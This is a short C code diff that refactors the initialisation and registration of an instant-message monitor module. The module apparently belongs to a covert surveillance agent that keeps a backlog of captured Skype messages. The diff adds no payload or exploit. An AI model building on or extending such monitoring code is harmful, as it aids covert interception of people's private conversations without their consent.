@@ -404,20 +404,15 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_IMInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_IMInit(JSONObject elem)
 {
 	if (!im_skype_message_list)
 		im_skype_message_list = (im_skype_message_entry *)calloc(SKYPE_MESSAGE_BACKLOG, sizeof(im_skype_message_entry));
-	PM_IMStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_IMRegister()
 {
-	AM_MonitorRegister(PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_IMInit(NULL, FALSE);
+	AM_MonitorRegisterBSON(L"chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
 }
